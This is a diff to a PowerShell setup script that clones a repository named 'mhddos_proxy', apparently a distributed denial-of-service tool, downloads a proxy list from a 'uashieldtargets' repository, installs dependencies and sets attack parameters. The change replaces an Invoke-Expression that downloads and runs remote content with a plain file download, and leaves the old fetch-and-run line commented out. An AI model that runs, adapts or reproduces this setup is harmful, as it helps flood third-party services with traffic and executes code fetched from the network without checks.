@@ -21,10 +21,9 @@ Remove-Item 'mhddos_proxy' -Recurse -Force
 git clone 'https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git'
 Set-Location '~/mhddos_proxy'
 Remove-Item 'proxies_config.json' -Recurse -Force
-Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/opengs/uashieldtargets/v2/proxy.json'))
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/opengs/uashieldtargets/v2/proxy.json -OutFile ./proxy.json
+#Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/opengs/uashieldtargets/v2/proxy.json'))
 python -m pip install -r 'requirements.txt'
-
-pause
 
 $p = ' -p 1200'
 $rpc = ' --rpc 1000'
